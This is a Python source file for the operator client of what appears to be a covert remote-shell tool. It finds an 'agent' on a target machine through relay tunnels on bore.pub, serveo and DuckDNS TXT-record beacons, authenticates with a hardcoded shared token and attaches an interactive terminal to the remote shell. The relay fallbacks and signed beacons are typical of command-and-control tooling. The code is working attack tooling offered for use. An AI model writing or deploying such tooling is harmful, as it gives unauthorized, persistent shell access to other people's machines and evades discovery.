"""Standalone operator client - single file, standard library only.

Copy this one file to any machine (Windows, Linux, macOS, phone via Termux) and
run it. It needs nothing from the node directory except the shared TOKEN, which
is read from the QU_TOKEN environment variable or from the constant below.

    python3 qu_client.py                      # auto-discover on bore.pub
    python3 qu_client.py bore.pub 44816       # explicit endpoint

Requires Python 3.6+ on the operator side. The target side needs nothing.
"""

import hashlib
import hmac
import os
import socket
import sys
import threading
import time

# Must match qu_core.TOKEN in the installed node.
TOKEN = os.environ.get("QU_TOKEN", "b7e1f4c2a95d43e8b06f7c1d2a3e4f50")

RELAY = os.environ.get("QU_RELAY", "bore.pub")
SCAN = int(os.environ.get("QU_SCAN", "16"))

# DuckDNS labels to read the beacon from (comma separated). Only needed when the
# relay port is not deterministic, e.g. the serveo fallback.
BEACON_LABELS = [x for x in os.environ.get("QU_DOMAINS", "").split(",") if x.strip()]


# --------------------------------------------------------------------------
# derivation (mirrors qu_core.py)
# --------------------------------------------------------------------------

def _digest():
    return hashlib.sha256(("qu:v1:" + TOKEN).encode("utf-8")).hexdigest()


def subdomain():
    return "qu" + _digest()[:10]


def public_port():
    return 20000 + (int(_digest()[10:18], 16) % 40000)


def sign(nonce):
    key = hashlib.sha256(("qu:auth:" + TOKEN).encode("utf-8")).digest()
    return hmac.new(key, nonce.encode("utf-8"), hashlib.sha256).hexdigest()


def auth_key():
    return hashlib.sha256(("qu:auth:" + TOKEN).encode("utf-8")).digest()


# --------------------------------------------------------------------------
# DuckDNS beacon (finds an agent whose relay port is not deterministic,
# e.g. the serveo fallback)
# --------------------------------------------------------------------------

def _encode_name(name):
    out = b""
    for label in name.strip(".").split("."):
        if label:
            out += bytes([len(label)]) + label.encode("ascii")
    return out + b"\x00"


def _skip_name(data, pos):
    while pos < len(data):
        ln = data[pos]
        if ln == 0:
            return pos + 1
        if ln & 0xC0 == 0xC0:
            return pos + 2
        pos += 1 + ln
    return pos


def txt_lookup(name, timeout=5.0):
    import struct
    servers = ["8.8.8.8", "1.1.1.1"]
    try:
        for line in open("/etc/resolv.conf"):
            if line.startswith("nameserver"):
                servers.insert(0, line.split()[1])
                break
    except Exception:
        pass
    qid = int(time.time() * 1000) & 0xFFFF
    packet = struct.pack("!HHHHHH", qid, 0x0100, 1, 0, 0, 0)
    packet += _encode_name(name) + struct.pack("!HH", 16, 1)
    for srv in servers:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(packet, (srv, 53))
            data, _ = s.recvfrom(4096)
            s.close()
            rid, _f, qd, an, _n, _a = struct.unpack("!HHHHHH", data[:12])
            if rid != qid or an < 1:
                continue
            pos = 12
            for _ in range(qd):
                pos = _skip_name(data, pos) + 4
            out = []
            for _ in range(an):
                pos = _skip_name(data, pos)
                rtype, _c, _t, rdlen = struct.unpack("!HHIH", data[pos:pos + 10])
                pos += 10
                rdata = data[pos:pos + rdlen]
                pos += rdlen
                if rtype != 16:
                    continue
                i, chunks = 0, []
                while i < len(rdata):
                    ln = rdata[i]
                    chunks.append(rdata[i + 1:i + 1 + ln].decode("utf-8", "replace"))
                    i += 1 + ln
                out.append("".join(chunks))
            if out:
                return out
        except Exception:
            continue
    return []


def beacon_verify(payload):
    """Return (server, port) for a correctly signed beacon, else None."""
    try:
        parts = (payload or "").strip().split("|")
        if len(parts) != 5 or parts[0] != "v1":
            return None
        _, server, port, nonce, sig = parts
        want = hmac.new(auth_key(), ("v1|%s|%s|%s" % (server, port, nonce)).encode(),
                        hashlib.sha256).hexdigest()[:16]
        if not hmac.compare_digest(sig, want):
            return None
        return server, int(port)
    except Exception:
        return None


def beacon_endpoint(labels):
    """Read the beacon from DuckDNS TXT records."""
    for label in labels:
        label = label.strip().strip(".")
        if label.endswith(".duckdns.org"):
            label = label[: -len(".duckdns.org")]
        for line in txt_lookup("%s.duckdns.org" % label):
            got = beacon_verify(line)
            if got:
                return got
    return None


# --------------------------------------------------------------------------
# discovery
# --------------------------------------------------------------------------

def _readline(sock, limit=1024):
    out = b""
    while len(out) < limit:
        ch = sock.recv(1)
        if not ch:
            return None
        if ch == b"\n":
            return out.decode("utf-8", "replace")
        out += ch
    return out.decode("utf-8", "replace")


def probe(host, port, timeout=2.5):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        line = _readline(s, 64)
        try:
            s.close()
        except Exception:
            pass
        if line and line.startswith("QU1 "):
            return line[4:].strip()
    except Exception:
        pass
    return None


def discover(host, base, span=SCAN):
    print("probing %s:%d..%d" % (host, base, base + span - 1))
    found = {}

    def check(p):
        n = probe(host, p)
        if n:
            found[p] = n

    threads = [threading.Thread(target=check, args=(base + i,)) for i in range(span)]
    for t in threads:
        t.daemon = True
        t.start()
    deadline = time.time() + 8
    while time.time() < deadline and len(found) < span:
        if found:
            break
        time.sleep(0.2)
    for t in threads:
        t.join(0.2)
    if not found:
        return None, None
    port = sorted(found)[0]
    return port, found[port]


# --------------------------------------------------------------------------
# interactive session
# --------------------------------------------------------------------------

def _attach(sock):
    state = {"raw": None}
    try:
        if os.name != "nt" and sys.stdin.isatty():
            import termios
            import tty
            fd = sys.stdin.fileno()
            state["raw"] = termios.tcgetattr(fd)
            tty.setraw(fd)
    except Exception:
        state["raw"] = None

    def pump():
        try:
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                sys.stdout.write(data.decode("utf-8", "replace"))
                sys.stdout.flush()
        except Exception:
            pass
        finally:
            try:
                sys.stdout.flush()
            except Exception:
                pass
            _restore(state)
            os._exit(0)

    t = threading.Thread(target=pump)
    t.daemon = True
    t.start()

    try:
        while True:
            if os.name == "nt":
                ch = sys.stdin.buffer.read(1)
            else:
                ch = os.read(sys.stdin.fileno(), 1)
            if not ch:
                break
            sock.sendall(ch)
    except Exception:
        pass
    finally:
        # Piped input (scripts, ssh one-liners) hits EOF before the remote has
        # answered. Do NOT half-close here: the far side treats EOF as
        # "hang up now" and would kill the shell mid-command. Just let the
        # reader drain, then tear it down.
        if sys.stdin.isatty():
            try:
                sock.shutdown(socket.SHUT_WR)
            except Exception:
                pass
            _restore(state)
            try:
                sock.close()
            except Exception:
                pass
        else:
            deadline = time.time() + 30
            while time.time() < deadline and t.is_alive():
                time.sleep(0.1)
            _restore(state)
            try:
                sock.close()
            except Exception:
                pass


def _restore(state):
    if state.get("raw") is None:
        return
    try:
        import termios
        termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, state["raw"])
    except Exception:
        pass
    state["raw"] = None


def connect(host, port):
    s = socket.create_connection((host, port), timeout=20)
    s.settimeout(None)
    try:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass
    line = _readline(s)
    if not line or not line.startswith("QU1 "):
        print("unexpected banner: %r" % line)
        return
    s.sendall(("HMAC %s\n" % sign(line[4:].strip())).encode())
    answer = _readline(s)
    if not answer or not answer.startswith("OK"):
        print("auth rejected: %r" % answer)
        return
    print("%s" % answer[3:].strip())
    _attach(s)


# --------------------------------------------------------------------------

def main(argv):
    host = argv[1] if len(argv) > 1 else RELAY
    if len(argv) > 2:
        port = int(argv[2])
    else:
        # 1) deterministic port (bore)
        port, _ = discover(host, public_port())

        # 2) DuckDNS beacon (serveo and any non-deterministic relay)
        if not port and BEACON_LABELS:
            hit = beacon_endpoint(BEACON_LABELS)
            if hit:
                host, port = hit
                print("beacon -> %s:%d" % (host, port))

        if not port:
            print("no agent found on %s (tried %d..%d)"
                  % (host, public_port(), public_port() + SCAN - 1))
            if not BEACON_LABELS:
                print("if the agent fell back to serveo, set QU_DOMAINS=<duckdns label>")
            print("derived label would be %s.duckdns.org" % subdomain())
            return 2
    print("connecting %s:%d" % (host, port))
    connect(host, port)
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv))
    except KeyboardInterrupt:
        sys.exit(0)
